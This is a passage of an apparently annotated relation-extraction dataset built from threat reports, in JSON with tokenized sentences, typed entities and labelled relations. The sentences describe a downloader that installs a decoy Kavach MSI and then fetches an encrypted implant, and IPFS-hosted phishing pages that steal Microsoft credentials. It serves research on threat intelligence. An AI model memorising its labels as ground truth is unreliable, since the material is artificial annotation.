"that", "contains", "the", "entire", "legitimate", "installer", "(", "MSI", ")", "for", "the", "Kavach", "application", "in", "its", "resources", "."], ["The", "zipped", "copy", "of", "the", "MSI", "is", "extracted", "from", "the", "downloader", "'", "s", "resources", "and", "executed", "on", "the", "system", "as", "a", "decoy", "to", "appear", "legitimate", "to", "the", "targets", "."], ["The", "actual", "implant", "is", "then", "downloaded", "from", "a", "remote", "location", ",", "AES-decrypted", "using", "a", "hardcoded", "key", ",", "written", "to", "disk", "and", "executed", "on", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "They", "pos": [0, 1], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [10, 10], "name": "infected endpoint", "pos": [10, 12], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [32, 32], "name": "Kavach", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "downloaders", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [47, 47], "name": "website", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "payload", "pos": [25, 26], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [80, 80], "name": "Kavach application ' s MSI installer", "pos": [8, 14], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [90, 90], "name": "website", "pos": [18, 19], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "Downloader", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "payload", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [111, 111], "name": "installer for Kavach", "pos": [8, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [130, 130], "name": "downloader binary", "pos": [15, 17], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [142, 142], "name": "MSI", "pos": [27, 28], "index": "12_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [153, 153], "name": "zipped", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "downloader ' s resources", "pos": [10, 14], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [189, 189], "name": "remote location", "pos": [8, 10], "index": "15_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 5}, {"r": "EX", "evidence": [2], "h": 3, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 3, "t": 7}, {"r": "FR", "evidence": [2, 3, 4], "h": 3, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 10}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "CD", "evidence": [4], "h": 8, "t": 10}, {"r": "EX", "evidence": [4], "h": 8, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 11}, {"r": "ST", "evidence": [4, 5, 6, 7], "h": 8, "t": 15}, {"r": "RF", "evidence": [4, 5, 6, 7], "h": 8, "t": 15}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}]}, {"title": "09-2", "sents": [["A", "splash", "screen", "is", "displayed", "to", "the", "victim", "notifying", "them", "that", "the", "Kavach", "application", "is", "being", "installed", ":"], ["The", "downloaders", "will", "then", "reach", "out", "to", "a", "malicious", "website", ",", "masquerading", "as", "a", "legitimate", "Indian", "government", "or", "pseudo-government", "entity", ",", "to", "download", "a", "malicious", "payload", "that", "is", "then", "activated", "on", "the", "endpoint", "."], ["Next", ",", "download", "a", "legitimate", "copy", "of", "the", "Kavach", "application", "'", "s", "MSI", "installer", "from", "yet", "another", "attacker-controlled", "website", "and", "execute", "it", "to", "make", "the", "whole", "attack", "chain", "appear", "legitimate", "."], ["Downloader", "fetching", "and", "executing", "malicious", "payload", "and", "legitimate", "installer", "for", "Kavach", "."], ["Another", "variation", "of", "the", "initial", "infection", "vector", "used", "in", "the", "campaign", "is", "a", "notably", "large", "downloader", "binary", "(", "141MB", ")", "that", "contains", "the", "entire", "legitimate", "installer", "(", "MSI", ")", "for", "the", "Kavach", "application", "in", "its", "resources", "."], ["The", "zipped", "copy", "of", "the", "MSI", "is", "extracted", "from", "the", "downloader", "'", "s", "resources", "and", "executed", "on", "the", "system", "as", "a", "decoy", "to", "appear", "legitimate", "to", "the", "targets", "."], ["The", "actual", "implant", "is", "then", "downloaded", "from", "a", "remote", "location", ",", "AES-decrypted", "using", "a", "hardcoded", "key", ",", "written", "to", "disk", "and", "executed", "on", "the", "infected", "endpoint", "."], ["The", "second", "variant", "of", "the", "downloader", "downloads", "and", "decrypts", "the", "payload", "from", "a", "remote", "location", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [12, 12], "name": "Kavach", "pos": [12, 13], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "downloaders", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [27, 27], "name": "website", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "payload", "pos": [25, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "Kavach application ' s MSI installer", "pos": [8, 14], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [70, 70], "name": "website", "pos": [18, 19], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "Downloader", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [88, 88], "name": "payload", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "installer for Kavach", "pos": [8, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [110, 110], "name": "downloader binary", "pos": [15, 17], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [122, 122], "name": "MSI", "pos": [27, 28], "index": "10_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [133, 133], "name": "zipped", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "downloader ' s resources", "pos": [10, 14], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [169, 169], "name": "remote location", "pos": [8, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [193, 193], "name": "downloader", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [196, 196], "name": "decrypts the payload", "pos": [8, 11], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [201, 201], "name": "remote location", "pos": [13, 15], "index": "16_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "EX", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 1, "t": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 8}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "CD", "evidence": [3], "h": 6, "t": 8}, {"r": "EX", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 9}, {"r": "ST", "evidence": [3, 4, 5, 6], "h": 6, "t": 13}, {"r": "RF", "evidence": [3, 4, 5, 6], "h": 6, "t": 13}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 11}, {"r": "WR", "evidence": [4, 5, 6, 7], "t": 9, "h": 14}, {"r": "WR", "evidence": [5, 6, 7], "t": 11, "h": 14}, {"r": "EX", "evidence": [5, 6, 7], "t": 12, "h": 14}, {"r": "ST", "evidence": [6, 7], "t": 13, "h": 14}, {"r": "RF", "evidence": [6, 7], "t": 13, "h": 14}, {"r": "WR", "evidence": [7], "h": 14, "t": 15}, {"r": "RF", "evidence": [7], "h": 14, "t": 16}]}, {"title": "608-0", "sents": [["When", "content", "is", "stored", "on", "the", "IPFS", "network", ",", "it", "is", "mirrored", "across", "many", "systems", "that", "participate", "in", "the", "network", ",", "so", "that", "when", "one", "of", "these", "systems", "is", "unavailable", ",", "other", "systems", "can", "service", "requests", "for", "this", "content", "."], ["IPFS", "stores", "different", "types", "of", "data", ",", "such", "as", "the", "images", "associated", "with", "NFTs", ",", "resources", "used", "to", "render", "web", "pages", ",", "or", "files", "that", "can", "be", "accessed", "by", "internet", "users", "."], ["IPFS", "gatewaysUsers", "that", "wish", "to", "access", "content", "stored", "within", "IPFS", "can", "do", "so", "either", "using", "an", "IPFS", "client", ",", "such", "as", "the", "one", "provided", "here", ",", "or", "they", "can", "make", "use", "of", "``", "IPFS", "Gateways", "''", "which", "effectively", "sit", "between", "the", "internet", "and", "the", "IPFS", "network", "to", "allow", "clients", "to", "access", "content", "hosted", "on", "the", "network", "."], ["When", "systems", "use", "IPFS", "gateways", "to", "access", "contents", "stored", "on", "the", "IPFS", "network", ",", "they", "typically", "rely", "on", "the", "same", "HTTP/HTTPS-based", "communications", "used", "to", "access", "other", "websites", "on", "the", "internet", "."], ["In", "some", "implementations", ",", "the", "subdomain", "specified", "in", "the", "HTTP", "request", "is", "often", "used", "to", "locate", "the", "requested", "resource", "on", "the", "IPFS", "network", "as", "shown", "in", "the", "following", "example", ",", "which", "is", "a", "mirrored", "copy", "of", "Wikipedia", "hosted", "on", "the", "IPFS", "network", "."], ["The", "IPFS", "identifier", ",", "or", "CID", ",", "for", "the", "resource", "is", "highlighted", "below.hxxps", ":", "bafybeiaysi4s6lnjev27ln5icwm6tue", "other", "implementations", ",", "the", "IPFS", "resource", "location", "is", "appended", "to", "the", "end", "of", "the", "URL", "being", "requested", ",", "as", "shown", "in", "the", "following", "example", ":", "hxxps", ":", "//ipfs.io/ipfs/bafybeiaysi4s6lnjev27ln5icwm6tue", "are", "other", "methods", "for", "handling", "requests", "using", "DNS", "entries", ",", "as", "well", "."], ["In", "one", "example", ",", "the", "victim", "received", "a", "PDF", "that", "purports", "to", "be", "associated", "with", "the", "DocuSign", "document-signing", "service", "."], ["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [6, 6], "name": "IPFS", "pos": [6, 7], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "IPFS", "pos": [0, 1], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [88, 88], "name": "IPFS", "pos": [16, 17], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [132, 132], "name": "IPFS", "pos": [3, 4], "index": "3_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [169, 169], "name": "HTTP request", "pos": [9, 11], "index": "4_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [232, 232], "name": "URL", "pos": [29, 30], "index": "5_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [264, 264], "name": "victim", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [267, 267], "name": "PDF", "pos": [8, 9], "index": "7_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [281, 281], "name": "victim", "pos": [2, 3], "index": "8_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [289, 289], "name": "link", "pos": [10, 11], "index": "9_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 3}, {"r": "ST", "evidence": [3, 4, 5], "h": 3, "t": 5}, {"r": "RF", "evidence": [3, 4, 5], "h": 3, "t": 5}, {"r": "ST", "evidence": [4, 5], "h": 4, "t": 5}, {"r": "RF", "evidence": [4, 5], "h": 4, "t": 5}, {"r": "ST", "evidence": [4, 5], "h": 4, "t": 5}, {"r": "RF", "evidence": [4, 5], "h": 4, "t": 5}, {"r": "ST", "evidence": [5, 6], "t": 5, "h": 6}, {"r": "RF", "evidence": [5, 6], "t": 5, "h": 6}, {"r": "RD", "evidence": [6], "h": 6, "t": 7}, {"r": "CO", "evidence": [6, 7], "h": 6, "t": 8}, {"r": "ST", "evidence": [7], "h": 8, "t": 9}]}, {"title": "608-1", "sents": [["IPFS", "stores", "different", "types", "of", "data", ",", "such", "as", "the", "images", "associated", "with", "NFTs", ",", "resources", "used", "to", "render", "web", "pages", ",", "or", "files", "that", "can", "be", "accessed", "by", "internet", "users", "."], ["IPFS", "gatewaysUsers", "that", "wish", "to", "access", "content", "stored", "within", "IPFS", "can", "do", "so", "either", "using", "an", "IPFS", "client", ",", "such", "as", "the", "one", "provided", "here", ",", "or", "they", "can", "make", "use", "of", "``", "IPFS", "Gateways", "''", "which", "effectively", "sit", "between", "the", "internet", "and", "the", "IPFS", "network", "to", "allow", "clients", "to", "access", "content", "hosted", "on", "the", "network", "."], ["When", "systems", "use", "IPFS", "gateways", "to", "access", "contents", "stored", "on", "the", "IPFS", "network", ",", "they", "typically", "rely", "on", "the", "same", "HTTP/HTTPS-based", "communications", "used", "to", "access", "other", "websites", "on", "the", "internet", "."], ["In", "some", "implementations", ",", "the", "subdomain", "specified", "in", "the", "HTTP", "request", "is", "often", "used", "to", "locate", "the", "requested", "resource", "on", "the", "IPFS", "network", "as", "shown", "in", "the", "following", "example", ",", "which", "is", "a", "mirrored", "copy", "of", "Wikipedia", "hosted", "on", "the", "IPFS", "network", "."], ["The", "IPFS", "identifier", ",", "or", "CID", ",", "for", "the", "resource", "is", "highlighted", "below.hxxps", ":", "bafybeiaysi4s6lnjev27ln5icwm6tue", "other", "implementations", ",", "the", "IPFS", "resource", "location", "is", "appended", "to", "the", "end", "of", "the", "URL", "being", "requested", ",", "as", "shown", "in", "the", "following", "example", ":", "hxxps", ":", "//ipfs.io/ipfs/bafybeiaysi4s6lnjev27ln5icwm6tue", "are", "other", "methods", "for", "handling", "requests", "using", "DNS", "entries", ",", "as", "well", "."], ["In", "one", "example", ",", "the", "victim", "received", "a", "PDF", "that", "purports", "to", "be", "associated", "with", "the", "DocuSign", "document-signing", "service", "."], ["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."], ["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [0, 0], "name": "IPFS", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [48, 48], "name": "IPFS", "pos": [16, 17], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [92, 92], "name": "IPFS", "pos": [3, 4], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [129, 129], "name": "HTTP request", "pos": [9, 11], "index": "3_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [192, 192], "name": "URL", "pos": [29, 30], "index": "4_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [224, 224], "name": "victim", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [227, 227], "name": "PDF", "pos": [8, 9], "index": "6_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [241, 241], "name": "victim", "pos": [2, 3], "index": "7_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [249, 249], "name": "link", "pos": [10, 11], "index": "8_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [279, 279], "name": "IPFS network", "pos": [10, 12], "index": "9_0"}]], "labels": [{"r": "ST", "evidence": [2, 3, 4], "h": 2, "t": 4}, {"r": "RF", "evidence": [2, 3, 4], "h": 2, "t": 4}, {"r": "ST", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "RF", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "ST", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "RF", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "ST", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "RF", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "RD", "evidence": [5], "h": 5, "t": 6}, {"r": "CO", "evidence": [5, 6], "h": 5, "t": 7}, {"r": "ST", "evidence": [6], "h": 7, "t": 8}, {"r": "RF", "evidence": [6, 7], "h": 7, "t": 9}]}, {"title": "608-2", "sents": [["IPFS", "gatewaysUsers", "that", "wish", "to", "access", "content", "stored", "within", "IPFS", "can", "do", "so", "either", "using", "an", "IPFS", "client", ",", "such", "as", "the", "one", "provided", "here", ",", "or", "they", "can", "make", "use", "of", "``", "IPFS", "Gateways", "''", "which", "effectively", "sit", "between", "the", "internet", "and", "the", "IPFS", "network", "to", "allow", "clients", "to", "access", "content", "hosted", "on", "the", "network", "."], ["When", "systems", "use", "IPFS", "gateways", "to", "access", "contents", "stored", "on", "the", "IPFS", "network", ",", "they", "typically", "rely", "on", "the", "same", "HTTP/HTTPS-based", "communications", "used", "to", "access", "other", "websites", "on", "the", "internet", "."], ["In", "some", "implementations", ",", "the", "subdomain", "specified", "in", "the", "HTTP", "request", "is", "often", "used", "to", "locate", "the", "requested", "resource", "on", "the", "IPFS", "network", "as", "shown", "in", "the", "following", "example", ",", "which", "is", "a", "mirrored", "copy", "of", "Wikipedia", "hosted", "on", "the", "IPFS", "network", "."], ["The", "IPFS", "identifier", ",", "or", "CID", ",", "for", "the", "resource", "is", "highlighted", "below.hxxps", ":", "bafybeiaysi4s6lnjev27ln5icwm6tue", "other", "implementations", ",", "the", "IPFS", "resource", "location", "is", "appended", "to", "the", "end", "of", "the", "URL", "being", "requested", ",", "as", "shown", "in", "the", "following", "example", ":", "hxxps", ":", "//ipfs.io/ipfs/bafybeiaysi4s6lnjev27ln5icwm6tue", "are", "other", "methods", "for", "handling", "requests", "using", "DNS", "entries", ",", "as", "well", "."], ["In", "one", "example", ",", "the", "victim", "received", "a", "PDF", "that", "purports", "to", "be", "associated", "with", "the", "DocuSign", "document-signing", "service", "."], ["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."], ["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."], ["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [16, 16], "name": "IPFS", "pos": [16, 17], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [60, 60], "name": "IPFS", "pos": [3, 4], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [97, 97], "name": "HTTP request", "pos": [9, 11], "index": "2_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [160, 160], "name": "URL", "pos": [29, 30], "index": "3_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [192, 192], "name": "victim", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [195, 195], "name": "PDF", "pos": [8, 9], "index": "5_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [209, 209], "name": "victim", "pos": [2, 3], "index": "6_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [217, 217], "name": "link", "pos": [10, 11], "index": "7_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [247, 247], "name": "IPFS network", "pos": [10, 12], "index": "8_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [251, 251], "name": "user", "pos": [1, 2], "index": "9_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [257, 257], "name": "email address", "pos": [7, 9], "index": "10_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [260, 260], "name": "password", "pos": [10, 11], "index": "11_0"}]], "labels": [{"r": "ST", "evidence": [1, 2, 3], "h": 1, "t": 3}, {"r": "RF", "evidence": [1, 2, 3], "h": 1, "t": 3}, {"r": "ST", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "RF", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "ST", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "RF", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "ST", "evidence": [3, 4], "t": 3, "h": 4}, {"r": "RF", "evidence": [3, 4], "t": 3, "h": 4}, {"r": "RD", "evidence": [4], "h": 4, "t": 5}, {"r": "CO", "evidence": [4, 5], "h": 4, "t": 6}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 4, "t": 9}, {"r": "ST", "evidence": [5], "h": 6, "t": 7}, {"r": "RF", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "WR", "evidence": [7], "h": 9, "t": 10}, {"r": "WR", "evidence": [7], "h": 9, "t": 11}, {"r": "CO", "evidence": [7], "h": 10, "t": 11}]}, {"title": "608-3", "sents": [["When", "systems", "use", "IPFS", "gateways", "to", "access", "contents", "stored", "on", "the", "IPFS", "network", ",", "they", "typically", "rely", "on", "the", "same", "HTTP/HTTPS-based", "communications", "used", "to", "access", "other", "websites", "on", "the", "internet", "."], ["In", "some", "implementations", ",", "the", "subdomain", "specified", "in", "the", "HTTP", "request", "is", "often", "used", "to", "locate", "the", "requested", "resource", "on", "the", "IPFS", "network", "as", "shown", "in", "the", "following", "example", ",", "which", "is", "a", "mirrored", "copy", "of", "Wikipedia", "hosted", "on", "the", "IPFS", "network", "."], ["The", "IPFS", "identifier", ",", "or", "CID", ",", "for", "the", "resource", "is", "highlighted", "below.hxxps", ":", "bafybeiaysi4s6lnjev27ln5icwm6tue", "other", "implementations", ",", "the", "IPFS", "resource", "location", "is", "appended", "to", "the", "end", "of", "the", "URL", "being", "requested", ",", "as", "shown", "in", "the", "following", "example", ":", "hxxps", ":", "//ipfs.io/ipfs/bafybeiaysi4s6lnjev27ln5icwm6tue", "are", "other", "methods", "for", "handling", "requests", "using", "DNS", "entries", ",", "as", "well", "."], ["In", "one", "example", ",", "the", "victim", "received", "a", "PDF", "that", "purports", "to", "be", "associated", "with", "the", "DocuSign", "document-signing", "service", "."], ["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."], ["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."], ["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."], ["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [3, 3], "name": "IPFS", "pos": [3, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "HTTP request", "pos": [9, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [103, 103], "name": "URL", "pos": [29, 30], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [135, 135], "name": "victim", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [138, 138], "name": "PDF", "pos": [8, 9], "index": "4_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [152, 152], "name": "victim", "pos": [2, 3], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [160, 160], "name": "link", "pos": [10, 11], "index": "6_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [190, 190], "name": "IPFS network", "pos": [10, 12], "index": "7_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [194, 194], "name": "user", "pos": [1, 2], "index": "8_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [200, 200], "name": "email address", "pos": [7, 9], "index": "9_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [203, 203], "name": "password", "pos": [10, 11], "index": "10_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [206, 206], "name": "information", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [212, 212], "name": "attacker", "pos": [7, 8], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [215, 215], "name": "HTTP POST", "pos": [10, 12], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [221, 221], "name": "web server", "pos": [16, 18], "index": "14_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "RF", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "ST", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "RF", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "ST", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "RF", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "ST", "evidence": [2, 3], "t": 2, "h": 3}, {"r": "RF", "evidence": [2, 3], "t": 2, "h": 3}, {"r": "RD", "evidence": [3], "h": 3, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 3, "t": 5}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 3, "t": 8}, {"r": "ST", "evidence": [4], "h": 5, "t": 6}, {"r": "RF", "evidence": [4, 5], "h": 5, "t": 7}, {"r": "WR", "evidence": [6], "h": 8, "t": 9}, {"r": "WR", "evidence": [6], "h": 8, "t": 10}, {"r": "CO", "evidence": [6], "h": 9, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 9, "t": 11}, {"r": "RD", "evidence": [7], "t": 11, "h": 12}, {"r": "WR", "evidence": [7], "t": 11, "h": 13}, {"r": "RF", "evidence": [7], "h": 13, "t": 14}]}, {"title": "608-4", "sents": [["In", "some", "implementations", ",", "the", "subdomain", "specified", "in", "the", "HTTP", "request", "is", "often", "used", "to", "locate", "the", "requested", "resource", "on", "the", "IPFS", "network", "as", "shown", "in", "the", "following", "example", ",", "which", "is", "a", "mirrored", "copy", "of", "Wikipedia", "hosted", "on", "the", "IPFS", "network", "."], ["The", "IPFS", "identifier", ",", "or", "CID", ",", "for", "the", "resource", "is", "highlighted", "below.hxxps", ":", "bafybeiaysi4s6lnjev27ln5icwm6tue", "other", "implementations", ",", "the", "IPFS", "resource", "location", "is", "appended", "to", "the", "end", "of", "the", "URL", "being", "requested", ",", "as", "shown", "in", "the", "following", "example", ":", "hxxps", ":", "//ipfs.io/ipfs/bafybeiaysi4s6lnjev27ln5icwm6tue", "are", "other", "methods", "for", "handling", "requests", "using", "DNS", "entries", ",", "as", "well", "."], ["In", "one", "example", ",", "the", "victim", "received", "a", "PDF", "that", "purports", "to", "be", "associated", "with", "the", "DocuSign", "document-signing", "service", "."], ["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."], ["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."], ["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."], ["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."], ["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [9, 9], "name": "HTTP request", "pos": [9, 11], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [72, 72], "name": "URL", "pos": [29, 30], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [104, 104], "name": "victim", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [107, 107], "name": "PDF", "pos": [8, 9], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [121, 121], "name": "victim", "pos": [2, 3], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [129, 129], "name": "link", "pos": [10, 11], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [159, 159], "name": "IPFS network", "pos": [10, 12], "index": "6_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [163, 163], "name": "user", "pos": [1, 2], "index": "7_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [169, 169], "name": "email address", "pos": [7, 9], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [172, 172], "name": "password", "pos": [10, 11], "index": "9_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [175, 175], "name": "information", "pos": [1, 2], "index": 